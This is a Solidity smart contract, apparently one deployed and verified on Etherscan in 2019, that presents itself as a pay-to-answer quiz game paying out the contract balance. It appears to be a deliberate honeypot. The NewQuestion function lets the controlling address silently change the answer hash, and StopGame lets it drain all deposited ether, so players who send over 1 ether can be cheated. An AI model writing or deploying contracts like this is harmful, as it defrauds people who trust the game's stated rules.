/**
 * Source Code first verified at https://etherscan.io on Wednesday, March 27, 2019
 (UTC) */

pragma solidity ^0.4.25;

contract QUICK_GAME
{

    function Try(string _response) external payable {
        require(msg.sender == tx.origin);

        if(responseHash == keccak256(_response) && msg.value > 1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }

    string public question;

    address questionSender;

    bytes32 responseHash;

    bytes32 questionerPin = 0x5454afaa908dc2afb945ee1674093e395634f5b0bc0cf83a361465e9fd9834fe;

    function Activate(bytes32 _questionerPin, string _question, string _response) public payable {
        if(keccak256(_questionerPin)==questionerPin) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
            questionerPin = 0x0;
        }
    }

    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }

    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }

    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }

    function() public payable{}
}